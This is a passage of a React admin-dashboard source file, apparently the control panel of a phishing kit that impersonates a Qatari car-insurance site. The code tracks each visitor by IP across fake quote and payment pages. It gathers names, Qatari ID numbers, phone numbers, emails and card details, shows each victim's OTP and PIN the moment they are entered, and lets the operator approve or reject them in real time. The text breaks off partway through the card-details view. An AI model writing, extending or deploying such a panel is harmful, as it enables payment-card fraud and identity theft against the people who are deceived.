import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { 
  LogOut, Search, Eye, RefreshCw, Users, CreditCard, 
  Shield, Clock, CheckCircle, XCircle, AlertCircle, Activity,
  DollarSign, Phone, Car, Navigation, Calendar, TrendingUp
} from 'lucide-react';
import { useSocket } from '../context/SocketContext';
import { 
  initAudioContext, 
  playNewVisitorSound, 
  playCardDataSound, 
  playOTPSound, 
  playPINSound,
  playCarDataSound
} from '../utils/notificationSounds';
import '../styles/AdminDashboard.css';

export default function AdminDashboard() {
  const navigate = useNavigate();
  const { socket, connected } = useSocket();
  
  const [customers, setCustomers] = useState([]);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterStatus, setFilterStatus] = useState('all');
  const [selectedCustomer, setSelectedCustomer] = useState(null);
  const [showDetailsModal, setShowDetailsModal] = useState(false);
  const [newDataCount, setNewDataCount] = useState(0);
  const [lastDataTimestamp, setLastDataTimestamp] = useState(null);
  const [stats, setStats] = useState({
    total: 0,
    active: 0,
    pending: 0,
    approved: 0,
    totalRevenue: 0
  });

  const [pendingOTP, setPendingOTP] = useState(null);
  const [pendingPIN, setPendingPIN] = useState(null);
  const [loading, setLoading] = useState(false);
  const [notification, setNotification] = useState({ show: false, type: '', message: '' });

  useEffect(() => {
    const isAuth = sessionStorage.getItem('adminAuthenticated');
    if (!isAuth) {
      navigate('/admin/login');
      return;
    }
    
    // Initialize audio system after user login
    initAudioContext();
  }, [navigate]);

  useEffect(() => {
    if (!socket) return;

    socket.emit('loadData');

    const refreshInterval = setInterval(() => {
      if (socket && connected) {
        socket.emit('loadData');
      }
    }, 5000);

    socket.on('initialData', (data) => {
      processCustomersData(data);
    });

    socket.on('newEntryAll', () => {
      setNewDataCount(prev => prev + 1);
      setLastDataTimestamp(Date.now());
      playNewVisitorSound();
      socket.emit('loadData');
      
      // Clear badge after 5 seconds
      setTimeout(() => {
        setNewDataCount(0);
      }, 5000);
    });

    socket.on('newOTP', (data) => {
      console.log('📨 Received newOTP:', data);
      setNewDataCount(prev => prev + 1);
      playOTPSound();
      // تطبيع البيانات للتأكد من وجود IP
      const normalizedData = {
        ...data,
        ip: data.ip || data.payload?.ip,
        otpCode: data.otpCode || data.payload?.otpCode,
        cardLastDigits: data.cardLastDigits || data.payload?.cardLastDigits,
        phoneNumber: data.phoneNumber || data.payload?.phoneNumber,
        amount: data.amount || data.payload?.amount
      };
      setPendingOTP(normalizedData);
    });

    socket.on('newPIN', (data) => {
      console.log('📨 Received newPIN:', data);
      setNewDataCount(prev => prev + 1);
      playPINSound();
      // تطبيع البيانات للتأكد من وجود IP
      const normalizedData = {
        ...data,
        ip: data.ip || data.payload?.ip,
        pinCode: data.pinCode || data.payload?.pinCode,
        cardLastDigits: data.cardLastDigits || data.payload?.cardLastDigits,
        phoneNumber: data.phoneNumber || data.payload?.phoneNumber,
        amount: data.amount || data.payload?.amount
      };
      setPendingPIN(normalizedData);
    });

    socket.on('userConnected', ({ ip }) => {
      setCustomers(prev => prev.map(c => 
        c.ip === ip ? { ...c, isActive: true } : c
      ));
    });

    socket.on('userDisconnected', ({ ip }) => {
      setCustomers(prev => prev.map(c => 
        c.ip === ip ? { ...c, isActive: false } : c
      ));
    });

    socket.on('locationUpdated', ({ ip, page, timestamp }) => {
      setCustomers(prev => {
        const existingCustomer = prev.find(c => c.ip === ip);
        
        if (existingCustomer) {
          // تحديث الصفحة الحالية للعميل الموجود
          return prev.map(c => 
            c.ip === ip ? { ...c, currentPage: page, lastUpdate: timestamp ? new Date(timestamp).getTime() : Date.now() } : c
          );
        } else {
          // إضافة عميل جديد إذا لم يكن موجوداً
          return [{
            ip,
            currentPage: page,
            carDetails: null,
            moreDetails: null,
            insurance: null,
            customerInfo: null,
            payments: [],
            otpCodes: [],
            pinCodes: [],
            status: 'pending',
            lastUpdate: timestamp ? new Date(timestamp).getTime() : Date.now(),
            isActive: true
          }, ...prev];
        }
      });
    });

    // استمع لتحديثات قائمة العملاء من الباكند
    socket.on('customersUpdate', (updatedCustomers) => {
      console.log('📋 Received customers update:', updatedCustomers);
      
      // دمج بيانات العملاء المحدثة مع البيانات الحالية
      setCustomers(prev => {
        const customersMap = new Map(prev.map(c => [c.ip, c]));
        
        updatedCustomers.forEach(customer => {
          const existing = customersMap.get(customer.ip);
          if (existing) {
            // تحديث العميل الموجود
            customersMap.set(customer.ip, {
              ...existing,
              currentPage: customer.currentPage,
              lastUpdate: customer.lastSeen ? new Date(customer.lastSeen).getTime() : existing.lastUpdate,
              isActive: customer.status === 'active'
            });
          } else {
            // إضافة عميل جديد
            customersMap.set(customer.ip, {
              ip: customer.ip,
              currentPage: customer.currentPage,
              carDetails: null,
              moreDetails: null,
              insurance: null,
              customerInfo: null,
              payments: [],
              otpCodes: [],
              pinCodes: [],
              status: 'pending',
              lastUpdate: customer.lastSeen ? new Date(customer.lastSeen).getTime() : Date.now(),
              isActive: customer.status === 'active'
            });
          }
        });
        
        return Array.from(customersMap.values()).sort((a, b) => b.lastUpdate - a.lastUpdate);
      });
    });

    // Listen for car details updates
    socket.on('carDetailsUpdated', ({ ip, carDetails, timestamp, playSound }) => {
      console.log('🚗 Car details updated for:', ip, carDetails);
      
      // Play notification sound
      if (playSound) {
        playCarDataSound();
        setNewDataCount(prev => prev + 1);
        setLastDataTimestamp(Date.now());
        
        // Clear badge after 5 seconds
        setTimeout(() => {
          setNewDataCount(0);
        }, 5000);
      }
      
      // Update customer in the list
      setCustomers(prev => {
        const customerIndex = prev.findIndex(c => c.ip === ip);
        
        if (customerIndex >= 0) {
          // Update existing customer and move to top
          const updatedCustomer = {
            ...prev[customerIndex],
            carDetails,
            lastUpdate: new Date(timestamp).getTime()
          };
          
          // Remove from current position and add to top
          const newList = [...prev];
          newList.splice(customerIndex, 1);
          newList.unshift(updatedCustomer);
          
          return newList;
        } else {
          // Add new customer at top
          return [{
            ip,
            currentPage: '/car-details',
            carDetails,
            moreDetails: null,
            insurance: null,
            customerInfo: null,
            payments: [],
            otpCodes: [],
            pinCodes: [],
            status: 'pending',
            lastUpdate: new Date(timestamp).getTime(),
            isActive: true
          }, ...prev];
        }
      });
    });

    return () => {
      clearInterval(refreshInterval);
      socket.off('initialData');
      socket.off('newEntryAll');
      socket.off('newOTP');
      socket.off('newPIN');
      socket.off('userConnected');
      socket.off('userDisconnected');
      socket.off('locationUpdated');
      socket.off('customersUpdate');
      socket.off('carDetailsUpdated');
    };
  }, [socket, connected]);

  const processCustomersData = (data) => {
    const customersMap = new Map();
    const allIPs = new Set();

    // جمع جميع IPs من جميع المصادر
    [
      data.carDetails, data.moreDetails, data.selectInsurance,
      data.insuranceInfo, data.payment, data.locations,
      data.otpCodes, data.pinCodes, data.plateNumber,
      data.policyDate, data.quote
    ].forEach(arr => {
      if (Array.isArray(arr)) {
        arr.forEach(item => item.ip && allIPs.add(item.ip));
      }
    });

    console.log('📊 Processing data for IPs:', Array.from(allIPs));

    allIPs.forEach(ip => {
      // جمع جميع السجلات لكل IP (لا نأخذ آخر سجل فقط، بل نحتفظ بالجميع)
      const carDetailsAll = data.carDetails?.filter(d => d.ip === ip) || [];
      const moreDetailsAll = data.moreDetails?.filter(d => d.ip === ip) || [];
      const insuranceAll = data.selectInsurance?.filter(d => d.ip === ip) || [];
      const customerInfoAll = data.insuranceInfo?.filter(d => d.ip === ip) || [];
      const plateNumberAll = data.plateNumber?.filter(d => d.ip === ip) || [];
      const policyDateAll = data.policyDate?.filter(d => d.ip === ip) || [];
      const quoteAll = data.quote?.filter(d => d.ip === ip) || [];
      
      // للعرض في الجدول، نأخذ آخر سجل
      const carDetails = carDetailsAll[carDetailsAll.length - 1];
      const moreDetails = moreDetailsAll[moreDetailsAll.length - 1];
      const insurance = insuranceAll[insuranceAll.length - 1];
      const customerInfo = customerInfoAll[customerInfoAll.length - 1];
      
      // البطاقات: نحتفظ بجميع السجلات (لا نأخذ آخر واحد فقط)
      const payments = data.payment?.filter(d => d.ip === ip) || [];
      const otpCodes = data.otpCodes?.filter(d => d.ip === ip) || [];
      const pinCodes = data.pinCodes?.filter(d => d.ip === ip) || [];
      
      const locations = data.locations?.filter(d => d.ip === ip) || [];
      const location = locations[locations.length - 1];
      const isActive = data.activeUsers?.includes(ip) || false;

      let status = 'pending';
      if (payments.length > 0) {
        const lastPayment = payments[payments.length - 1];
        status = lastPayment.status || 'pending';
      }

      const allTimestamps = [
        ...(carDetailsAll.map(c => c.timestamp)),
        ...(moreDetailsAll.map(m => m.timestamp)),
        ...(insuranceAll.map(i => i.timestamp)),
        ...(customerInfoAll.map(ci => ci.timestamp)),
        ...(payments.map(p => p.timestamp)),
        ...(otpCodes.map(o => o.timestamp)),
        ...(pinCodes.map(p => p.timestamp))
      ].filter(Boolean);
      
      const lastUpdate = allTimestamps.length > 0 
        ? new Date(Math.max(...allTimestamps.map(t => new Date(t).getTime())))
        : new Date();

      console.log(`👤 User ${ip}: ${payments.length} payments, ${otpCodes.length} OTPs, ${pinCodes.length} PINs`);

      customersMap.set(ip, {
        ip,
        currentPage: location?.currentPage || '/',
        carDetails,
        moreDetails,
        insurance,
        customerInfo,
        payments,        // جميع البطاقات
        otpCodes,        // جميع OTPs
        pinCodes,        // جميع PINs
        status,
        lastUpdate: lastUpdate.getTime(),
        isActive
      });
    });

    const customersList = Array.from(customersMap.values()).sort((a, b) => 
      new Date(b.lastUpdate) - new Date(a.lastUpdate)
    );

    console.log('✅ Processed customers:', customersList.length);
    setCustomers(customersList);
    updateStats(customersList);
  };

  const updateStats = (customersList) => {
    const stats = {
      total: customersList.length,
      active: customersList.filter(c => c.isActive).length,
      pending: customersList.filter(c => c.status === 'pending').length,
      approved: customersList.filter(c => c.status === 'approved').length,
      totalRevenue: customersList
        .filter(c => c.status === 'approved')
        .reduce((sum, c) => sum + (parseFloat(c.payments[0]?.amount) || 0), 0)
    };
    setStats(stats);
  };

  const handleLogout = () => {
    sessionStorage.clear();
    navigate('/admin/login');
  };

  const handleRefresh = () => {
    if (socket) {
      socket.emit('loadData');
      showNotification('info', '🔄 جاري تحديث البيانات...');
    }
  };

  const showNotification = (type, message) => {
    setNotification({ show: true, type, message });
    setTimeout(() => {
      setNotification({ show: false, type: '', message: '' });
    }, 3000);
  };

  const approveOTP = () => {
    if (socket && pendingOTP) {
      setLoading(true);
      const ip = pendingOTP.ip || pendingOTP.payload?.ip || pendingOTP.userIp;
      console.log('✅ Approving OTP for IP:', ip, 'Full data:', pendingOTP);
      
      socket.emit('otpVerificationStatus', {
        ip: ip,
        status: 'approved',
        message: 'تم قبول رمز التحقق'
      });
      
      setTimeout(() => {
        setLoading(false);
        setPendingOTP(null);
        showNotification('success', '✅ تم قبول رمز التحقق OTP بنجاح');
      }, 500);
    }
  };

  const rejectOTP = () => {
    if (socket && pendingOTP) {
      if (!window.confirm('⚠️ هل أنت متأكد من رفض رمز التحقق OTP؟')) return;
      
      setLoading(true);
      const ip = pendingOTP.ip || pendingOTP.payload?.ip || pendingOTP.userIp;
      console.log('❌ Rejecting OTP for IP:', ip, 'Full data:', pendingOTP);
      
      socket.emit('otpVerificationStatus', {
        ip: ip,
        status: 'rejected',
        message: 'رمز التحقق غير صحيح'
      });
      
      setTimeout(() => {
        setLoading(false);
        setPendingOTP(null);
        showNotification('error', '❌ تم رفض رمز التحقق OTP');
      }, 500);
    }
  };

  const approvePIN = () => {
    if (socket && pendingPIN) {
      setLoading(true);
      const ip = pendingPIN.ip || pendingPIN.payload?.ip || pendingPIN.userIp;
      console.log('✅ Approving PIN for IP:', ip, 'Full data:', pendingPIN);
      
      socket.emit('pinVerificationStatus', {
        ip: ip,
        status: 'approved',
        message: 'تم قبول الرمز السري'
      });
      
      setTimeout(() => {
        setLoading(false);
        setPendingPIN(null);
        showNotification('success', '✅ تم قبول الرمز السري PIN بنجاح');
      }, 500);
    }
  };

  const rejectPIN = () => {
    if (socket && pendingPIN) {
      if (!window.confirm('⚠️ هل أنت متأكد من رفض الرمز السري PIN؟')) return;
      
      setLoading(true);
      const ip = pendingPIN.ip || pendingPIN.payload?.ip || pendingPIN.userIp;
      console.log('❌ Rejecting PIN for IP:', ip, 'Full data:', pendingPIN);
      
      socket.emit('pinVerificationStatus', {
        ip: ip,
        status: 'rejected',
        message: 'الرمز السري غير صحيح'
      });
      
      setTimeout(() => {
        setLoading(false);
        setPendingPIN(null);
        showNotification('error', '❌ تم رفض الرمز السري PIN');
      }, 500);
    }
  };

  const viewDetails = (customer) => {
    setSelectedCustomer(customer);
    setShowDetailsModal(true);
  };

  const filteredCustomers = customers.filter(customer => {
    const matchesSearch = 
      customer.ip?.includes(searchTerm) ||
      customer.customerInfo?.name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      customer.customerInfo?.qid?.includes(searchTerm) ||
      customer.customerInfo?.phone?.includes(searchTerm) ||
      customer.customerInfo?.email?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      customer.carDetails?.make?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      customer.carDetails?.model?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      customer.moreDetails?.plateNumber?.includes(searchTerm);

    const matchesFilter = 
      filterStatus === 'all' ||
      (filterStatus === 'active' && customer.isActive) ||
      (filterStatus === 'offline' && !customer.isActive) ||
      (filterStatus === customer.status);

    return matchesSearch && matchesFilter;
  });

  const getStatusBadge = (status) => {
    const styles = {
      pending: 'bg-gradient-to-r from-yellow-400 to-yellow-500 text-white shadow-lg shadow-yellow-400/50',
      approved: 'bg-gradient-to-r from-green-500 to-emerald-600 text-white shadow-lg shadow-green-400/50',
      rejected: 'bg-gradient-to-r from-red-500 to-rose-600 text-white shadow-lg shadow-red-400/50',
      waiting: 'bg-gradient-to-r from-blue-500 to-cyan-600 text-white shadow-lg shadow-blue-400/50'
    };

    const icons = {
      pending: <Clock className="w-3.5 h-3.5" />,
      approved: <CheckCircle className="w-3.5 h-3.5" />,
      rejected: <XCircle className="w-3.5 h-3.5" />,
      waiting: <AlertCircle className="w-3.5 h-3.5" />
    };

    const labels = {
      pending: 'قيد الانتظار',
      approved: 'مو افق عليه',
      rejected: 'مرفوض',
      waiting: 'انتظار'
    };

    return (
      <span className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-bold transition-all hover:scale-105 ${styles[status] || styles.pending}`}>
        {icons[status]}
        {labels[status] || status.toUpperCase()}
      </span>
    );
  };

  const getPageBadge = (page) => {
    const pageNames = {
      '/الصفحة الرئيسية': 'الصفحة الرئيسية',
      '/car-details': 'بيانات المركبة',
      '/more-details': 'المزيد من البيانات',
      '/select-insurance': 'اختيار التأمين',
      '/plate-number': 'رقم اللوحة',
      '/info-insurance': 'البيانات الشخصية',
      '/policy-date': 'تاريخ البوليصة',
      '/quotecheaK': 'عرض السعر',
      '/paydcc': 'الدفع - DCC',
      '/payqpay': 'الدفع - QPay',
      '/payment-otp': 'إدخال OTP',
      '/otp-verification': 'تحقق OTP',
      '/payment-pin': 'إدخال PIN',
      '/pin-verification': 'تحقق PIN',
      '/payment-success': 'نجح الدفع',
      '/payment-failed': 'فشل الدفع'
    };

    return pageNames[page] || page;
  };

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {/* Notification Toast */}
      {notification.show && (
        <div className={`toast-notification fixed top-4 left-1/2 transform -translate-x-1/2 z-[100] ${
          notification.type === 'success' ? 'bg-gradient-to-r from-green-500 to-emerald-600' :
          notification.type === 'error' ? 'bg-gradient-to-r from-red-500 to-rose-600' :
          'bg-gradient-to-r from-blue-500 to-cyan-600'
        } text-white px-6 py-4 rounded-xl shadow-2xl flex items-center gap-3`}>
          {notification.type === 'success' && <CheckCircle className="w-6 h-6 animate-pulse" />}
          {notification.type === 'error' && <XCircle className="w-6 h-6 animate-pulse" />}
          {notification.type === 'info' && <AlertCircle className="w-6 h-6 animate-pulse" />}
          <span className="font-semibold text-lg">{notification.message}</span>
        </div>
      )}

      {/* Loading Overlay */}
      {loading && (
        <div className="loading-overlay fixed inset-0 bg-black/50 flex items-center justify-center z-[90] backdrop-blur-sm">
          <div className="bg-white rounded-2xl p-8 flex flex-col items-center gap-4 shadow-2xl">
            <div className="w-16 h-16 border-4 border-qiic-maroon border-t-transparent rounded-full animate-spin"></div>
            <p className="text-gray-700 font-semibold text-lg">جاري المعالجة...</p>
          </div>
        </div>
      )}

      {/* OTP Modal */}
      {pendingOTP && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-8 animate-bounce-in">
            <div className="text-center mb-6">
              <div className="w-20 h-20 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <Shield className="w-10 h-10 text-purple-600" />
              </div>
              <h2 className="text-2xl font-bold text-gray-800 mb-2">🔐 رمز التحقق OTP</h2>
              <p className="text-gray-600">يرجى مراجعة الرمز والموافقة أو الرفض</p>
            </div>

            <div className="bg-gradient-to-br from-purple-50 to-purple-100 rounded-xl p-6 mb-6">
              <div className="text-center mb-4">
                <p className="text-sm text-gray-600 mb-2">الرمز المُدخل</p>
                <div className="text-4xl font-mono font-bold text-purple-600 tracking-widest">
                  {pendingOTP.otpCode || pendingOTP.payload?.otpCode}
                </div>
              </div>
              
              <div className="border-t border-purple-200 pt-4 space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-600">البطاقة:</span>
                  <span className="font-mono font-semibold">**** {pendingOTP.cardLastDigits || pendingOTP.payload?.cardLastDigits}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">الهاتف:</span>
                  <span className="font-mono font-semibold">{pendingOTP.phoneNumber || pendingOTP.payload?.phoneNumber}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">المبلغ:</span>
                  <span className="font-bold text-purple-600">{pendingOTP.amount || pendingOTP.payload?.amount} ريال</span>
                </div>
              </div>
            </div>

            <div className="flex gap-3">
              <button
                onClick={approveOTP}
                disabled={loading}
                className="flex-1 bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 active:scale-95 shadow-lg shadow-green-500/50 flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {loading ? (
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                ) : (
                  <CheckCircle className="w-5 h-5" />
                )}
                {loading ? 'جاري المعالجة...' : 'قبول'}
              </button>
              <button
                onClick={rejectOTP}
                disabled={loading}
                className="flex-1 bg-gradient-to-r from-red-500 to-rose-600 hover:from-red-600 hover:to-rose-700 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 active:scale-95 shadow-lg shadow-red-500/50 flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                <XCircle className="w-5 h-5" />
                رفض
              </button>
            </div>
          </div>
        </div>
      )}

      {/* PIN Modal */}
      {pendingPIN && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-8 animate-bounce-in">
            <div className="text-center mb-6">
              <div className="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <CreditCard className="w-10 h-10 text-blue-600" />
              </div>
              <h2 className="text-2xl font-bold text-gray-800 mb-2">🔑 الرمز السري PIN</h2>
              <p className="text-gray-600">يرجى مراجعة الرمز والموافقة أو الرفض</p>
            </div>

            <div className="bg-gradient-to-br from-blue-50 to-blue-100 rounded-xl p-6 mb-6">
              <div className="text-center mb-4">
                <p className="text-sm text-gray-600 mb-2">الرمز المُدخل</p>
                <div className="text-4xl font-mono font-bold text-blue-600 tracking-widest">
                  {pendingPIN.pinCode || pendingPIN.payload?.pinCode}
                </div>
              </div>
              
              <div className="border-t border-blue-200 pt-4 space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-600">البطاقة:</span>
                  <span className="font-mono font-semibold">**** {pendingPIN.cardLastDigits || pendingPIN.payload?.cardLastDigits}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">الهاتف:</span>
                  <span className="font-mono font-semibold">{pendingPIN.phoneNumber || pendingPIN.payload?.phoneNumber}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">المبلغ:</span>
                  <span className="font-bold text-blue-600">{pendingPIN.amount || pendingPIN.payload?.amount} ريال</span>
                </div>
              </div>
            </div>

            <div className="flex gap-3">
              <button
                onClick={approvePIN}
                disabled={loading}
                className="flex-1 bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 active:scale-95 shadow-lg shadow-green-500/50 flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {loading ? (
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                ) : (
                  <CheckCircle className="w-5 h-5" />
                )}
                {loading ? 'جاري المعالجة...' : 'قبول'}
              </button>
              <button
                onClick={rejectPIN}
                disabled={loading}
                className="flex-1 bg-gradient-to-r from-red-500 to-rose-600 hover:from-red-600 hover:to-rose-700 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 active:scale-95 shadow-lg shadow-red-500/50 flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                <XCircle className="w-5 h-5" />
                رفض
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Details Modal */}
      {showDetailsModal && selectedCustomer && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-40 p-4 overflow-y-auto">
          <div className="bg-white rounded-2xl shadow-2xl max-w-6xl w-full my-8">
            <div className="bg-gradient-to-r from-qiic-maroon to-red-900 text-white p-6 rounded-t-2xl sticky top-0 z-10">
              <div className="flex items-center justify-between">
                <h2 className="text-2xl font-bold">تفاصيل العميل الكاملة</h2>
                <button
                  onClick={() => setShowDetailsModal(false)}
                  className="text-white hover:bg-white/20 rounded-lg p-2 transition-colors"
                >
                  <XCircle className="w-6 h-6" />
                </button>
              </div>
              <div className="mt-4 flex items-center gap-4 flex-wrap">
                <div className="flex items-center gap-2">
                  <div className={`w-3 h-3 rounded-full ${selectedCustomer.isActive ? 'bg-green-400 animate-pulse' : 'bg-gray-400'}`}></div>
                  <span>{selectedCustomer.isActive ? 'نشط الآن' : 'غير متصل'}</span>
                </div>
                <div className="flex items-center gap-2">
                  <Navigation className="w-4 h-4" />
                  <span className="text-sm">{getPageBadge(selectedCustomer.currentPage)}</span>
                </div>
                <div className="flex items-center gap-2">
                  <Clock className="w-4 h-4" />
                  <span className="text-sm">آخر تحديث: {new Date(selectedCustomer.lastUpdate).toLocaleString('ar-QA')}</span>
                </div>
              </div>
            </div>

            <div className="p-6 space-y-6 max-h-[70vh] overflow-y-auto">
              {/* Customer Personal Info */}
              <div className="bg-gradient-to-br from-blue-50 to-blue-100 rounded-xl p-6">
                <h3 className="font-bold text-xl mb-4 flex items-center gap-2 text-blue-900">
                  <Users className="w-6 h-6 text-blue-600" />
                  البيانات الشخصية
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div className="bg-white rounded-lg p-4">
                    <p className="text-gray-600 text-sm mb-1">الاسم الكامل</p>
                    <p className="font-bold text-gray-900">{selectedCustomer.customerInfo?.name || '—'}</p>
                  </div>
                  <div className="bg-white rounded-lg p-4">
                    <p className="text-gray-600 text-sm mb-1">رقم البطاقة القطرية (QID)</p>
                    <p className="font-mono font-bold text-blue-600">{selectedCustomer.customerInfo?.qid || selectedCustomer.moreDetails?.qid || '—'}</p>
                  </div>
                  <div className="bg-white rounded-lg p-4">
                    <p className="text-gray-600 text-sm mb-1">رقم الجوال</p>
                    <p className="font-mono font-semibold">{selectedCustomer.customerInfo?.phone || '—'}</p>
                  </div>
                  <div className="bg-white rounded-lg p-4">
                    <p className="text-gray-600 text-sm mb-1">البريد الإلكتروني</p>
                    <p className="text-sm font-semibold break-all">{selectedCustomer.customerInfo?.email || '—'}</p>
                  </div>
                  <div className="bg-white rounded-lg p-4">
                    <p className="text-gray-600 text-sm mb-1">عنوان IP</p>
                    <p className="font-mono font-semibold text-purple-600">{selectedCustomer.ip}</p>
                  </div>
                  <div className="bg-white rounded-lg p-4">
                    <p className="text-gray-600 text-sm mb-1">الحالة</p>
                    <div>{getStatusBadge(selectedCustomer.status)}</div>
                  </div>
                </div>
              </div>

              {/* Vehicle Details */}
              {(selectedCustomer.carDetails || selectedCustomer.moreDetails) && (
                <div className="bg-gradient-to-br from-green-50 to-green-100 rounded-xl p-6">
                  <h3 className="font-bold text-xl mb-4 flex items-center gap-2 text-green-900">
                    <Car className="w-6 h-6 text-green-600" />
                    بيانات المركبة
                  </h3>
                  <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-5 gap-4">
                    {/* نوع السيارة */}
                    {selectedCustomer.moreDetails?.vehicleType && (
                      <div className="bg-white rounded-lg p-4 shadow-sm border border-green-200">
                        <p className="text-gray-600 text-sm mb-1">نوع السيارة</p>
                        <p className="font-bold text-green-700">{selectedCustomer.moreDetails.vehicleType}</p>
                      </div>
                    )}
                    
                    {/* شكل السيارة */}
                    {selectedCustomer.moreDetails?.bodyType && (
                      <div className="bg-white rounded-lg p-4 shadow-sm border border-green-200">
                        <p className="text-gray-600 text-sm mb-1">شكل السيارة</p>
                        <p className="font-bold text-green-700">{selectedCustomer.moreDetails.bodyType}</p>
                      </div>
                    )}
                    
                    {/* تاريخ تسجيل السيارة */}
                    {selectedCustomer.moreDetails?.registrationDate && (
                      <div className="bg-white rounded-lg p-4 shadow-sm border border-green-200">
                        <p className="text-gray-600 text-sm mb-1">تاريخ تسجيل السيارة</p>
                        <p className="font-mono font-bold text-green-700">{selectedCustomer.moreDetails.registrationDate}</p>
                      </div>
                    )}
                    
                    {/* نوع التأمين */}
                    {selectedCustomer.insurance?.insuranceType && (
                      <div className="bg-white rounded-lg p-4 shadow-sm border border-orange-200">
                        <p className="text-gray-600 text-sm mb-1">نوع التأمين</p>
                        <p className="font-bold text-orange-600">{selectedCustomer.insurance.insuranceType}</p>
                      </div>
                    )}
                    
                    {/* رقم اللوحة */}
                    {(selectedCustomer.moreDetails?.plateNumber || selectedCustomer.carDetails?.plateNumber) && (
                      <div className="bg-white rounded-lg p-4 shadow-sm border-2 border-green-400">
                        <p className="text-gray-600 text-sm mb-1">رقم اللوحة</p>
                        <p className="font-mono font-bold text-green-600 text-lg">
                          {selectedCustomer.moreDetails?.plateNumber || selectedCustomer.carDetails?.plateNumber}
                        </p>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* Insurance Info */}
              {selectedCustomer.insurance && (
                <div className="bg-gradient-to-br from-orange-50 to-orange-100 rounded-xl p-6">
                  <h3 className="font-bold text-xl mb-4 flex items-center gap-2 text-orange-900">
                    <Shield className="w-6 h-6 text-orange-600" />
                    معلومات التأمين
                  </h3>
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <div className="bg-white rounded-lg p-4">
                      <p className="text-gray-600 text-sm mb-1">نوع التأمين</p>
                      <p className="font-bold text-orange-600">{selectedCustomer.insurance.insuranceType || '—'}</p>
                    </div>
                    <div className="bg-white rounded-lg p-4">
                      <p className="text-gray-600 text-sm mb-1">المبلغ المطلوب</p>
                      <p className="font-bold text-orange-600">{selectedCustomer.insurance.amount || '—'} ريال</p>
                    </div>
                    <div className="bg-white rounded-lg p-4">
                      <p className="text-gray-600 text-sm mb-1">تاريخ الاختيار</p>
                      <p className="font-mono text-sm">{selectedCustomer.insurance.timestamp ? new Date(selectedCustomer.insurance.timestamp).toLocaleString('ar-QA') : '—'}</p>
                    </div>
                  </div>
                </div>
              )}

              {/* Payment Cards */}
              {selectedCustomer.payments && selectedCustomer.payments.length > 0 && (
                <div className="bg-gradient-to-br from-purple-50 to-purple-100 rounded-xl p-6">
                  <h3 className="font-bold text-xl mb-4 flex items-center gap-2 text-purple-900">
                    <CreditCard className="w-6 h-6 text-purple-600" />
                    معلومات البطاقات ({selectedCustomer.payments.length})
                  </h3>
                  <div className="space-y-4">
                    {selectedCustomer.payments.map((payment, idx) => (
                      <div key={idx} className="bg-white rounded-lg p-5 border-2 border-purple-200 shadow-sm">
                        <div className="flex items-center justify-between mb-4">
                          <div className="flex items-center gap-3">
                            <span className="text-sm font-bold text-purple-600 bg-purple-100 px-4 py-1.5 rounded-full">
                              البطاقة #{idx + 1}
                            </span>
                            {idx === selectedCustomer.payments.length - 1 && (
                              <span className="text-xs text-green-600 bg-green-100 px-3 py-1 rounded-full font-semibold">
                                الأحدث
                              </span>
                            )}
                          </div>
                          <span className="text-xs text-gray-600">
                            {new Date(payment.timestamp || payment.time).toLocaleString('ar-QA')}
                          </span>
                        </div>

                        {/* Payment Method - Always show */}
                        <div className="mb-4 pb-4 border-b border-purple-100">
                          <p className="text-gray-600 text-sm mb-1">طريقة الدفع:</p>
                          <p className="font-bold text-purple-600 text-lg">
                            {payment.paymentMethod || 'غير محدد'}
                          </p>
                        </div>

                        {/* Card Details - Only for Mada/Visa */}
                        {payment.paymentMethod && (payment.paymentMethod.toLowerCase().includes('mada') || payment.paymentMethod.toLowerCase().includes('visa')) && (
                          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-4">
                            <div className="bg-purple-50 rounded-lg p-3">
                              <p className="text-gray-600 text-xs mb-1">اسم حامل البطاقة:</p>
                              <p className="font-semibold text-gray-900">{payment.cardHolderName || '—'}</p>
                            </div>
                            <div className="bg-purple-50 rounded-lg p-3">
